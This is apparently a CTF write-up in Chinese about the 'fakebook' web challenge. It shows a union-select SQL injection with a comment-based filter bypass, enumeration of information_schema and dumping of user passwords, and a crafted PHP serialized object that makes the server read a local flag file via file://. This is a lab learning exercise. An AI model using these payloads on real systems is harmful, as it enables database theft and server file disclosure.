![[Pasted image 20221110205018.png]]

首页
![[Pasted image 20221110205134.png]]

`/login.php`
![[Pasted image 20221110205223.png]]

`/login.php`的账号密码直接`POST`到`/login.ok.php`
![[Pasted image 20221110205532.png]]

认证失败时通过`javascript`返回上一页
![[Pasted image 20221110205740.png]]

`/join.php`
![[Pasted image 20221110205258.png]]

`/join.php`也是直接通过`POST`实现
![[Pasted image 20221110210119.png]]

提示`blog`非法
![[Pasted image 20221110210213.png]]

修改`blog`为`https://www.baidu.com`（百度，惨）
```
username=admin&passwd=123&age=18&blog=https://www.baidu.com
```

提示加入成功
```js
alert('Join success');
location.href='/';
```

返回首页能看到相关信息
![[Pasted image 20221110210541.png]]

`username`这一列还有个超链接，点击能访问`/view.php?no=1`
![[Pasted image 20221110210858.png]]

下面出现了一个没显示全的滚动条，莫非是隐藏了什么惊天大秘密QwQ

审查元素发现这里直接用的`iframe`，而且`src`用的也不是url，而是`base64`编码过后的`html`
![[Pasted image 20221110211327.png]]

改`height`属性为`1000em`，发现解码之后正是刚才`join`时输入的百度的首页，
![[Pasted image 20221110211629.png]]
这里图片加载不出来好像是图片的`src`利用了协议依赖加载的原因（？），从`base64`解码出来的页面不知道是不是把图片路径解析成`file://`协议了

像上面所说的，既然不是直接在`iframe`里提供`https://www.baidu.com`的`url`，而是提供`base64`编码的`html`文件，说明`blog`所指示的页面是在服务端被访问的

抱着好奇试了试套娃
```sql
blog=/view.php?no=3
```
![[Pasted image 20221110214123.png]]

然后服务器就炸了wuwuwu
![[Pasted image 20221110214228.png]]

~~Two thousand years later~~
重启靶机继续迫害(
虽然知道可以利用这一点来让服务器访问任意`url`，但我想不到怎么利用这点QAQ

于是郁闷的改了改`view.php`的`no`参数
```sql
/view.php?no=1
```
![[Pasted image 20221110220444.png]]
靶机重启过，所以`no=1`是不存在的
好像可以注入的样子，有点起色了
```sql
/view.php?no=a
```
![[Pasted image 20221110220630.png]]

好家伙，报了查询错误，可能确实可以`sql`注入
```sql
/view.php?no=1 union select 1#
```
> no hack ~_~

这个no hack就有种此地无银三百两的意味了QwQ
看看什么东西被ban了
```sql
/view.php?no=1 union#
```
> [\*] query error! (You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' at line 1)
```sql
/view.php?no=1 select#
```
还是一样的报语法错误
```sql
/view.php?no=union select
```
> no hack ~_~

确定是`"union select"`被匹配了
尝试用`/**/`绕过，然后判断注入点
```sql
/view.php?no=1 union/**/select 1,2,3,4#
```
![[Pasted image 20221110221754.png]]

发现第二列对应`username`
```sql
/view.php?no=1 union/**/select 1,group_concat(schema_name),3,4 from information_schema.schemata#
```
![[Pasted image 20221111092722.png]]

```sql
/view.php?no=1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='fakebook'#
```
![[Pasted image 20221111093042.png]]

```sql
/view.php?no=1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='users'#
```
![[Pasted image 20221111093315.png]]

后来添加了一个用户
```sql
/view.php?no=2 union/**/select 1,group_concat(no),3,4 from fakebook.users#
```
![[Pasted image 20221111095911.png]]

```sql
/view.php?no=2 union/**/select 1,group_concat(username),3,4 from fakebook.users#
```
![[Pasted image 20221111095949.png]]

```sql
/view.php?no=2 union/**/select 1,group_concat(passwd),3,4 from fakebook.users#
```
![[Pasted image 20221111100022.png]]

```sql
/view.php?no=2 union/**/select 1,group_concat(data),3,4 from fakebook.users#
```
![[Pasted image 20221111100108.png]]
这里发现`data`字段是序列化过后的用户信息
![[Pasted image 20221111100358.png]]
结合反序列化的错误提示，推测`view.php`的生成基于`data`的反序列化
```sql
/view.php?no=2 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:18;s:4:"blog";s:21:"https://www.baidu.com";}'#
```
![[Pasted image 20221111100740.png]]

猜测`flag`放在`flag.php`里
```sql
/view.php?no=2 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:18;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'#
```
```html
<iframe width='100%' height='10em' src='data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3szNDMyZDYyZS0wMWM3LTQyMzQtOTAxOC1lYzJhMGFmMGQ0NDR9IjsNCmV4aXQoMCk7DQo='>
</div>
```
结果还真猜对了QwQ
![[Pasted image 20221111101944.png]]
#Web #SQL注入 #反序列化 #RFI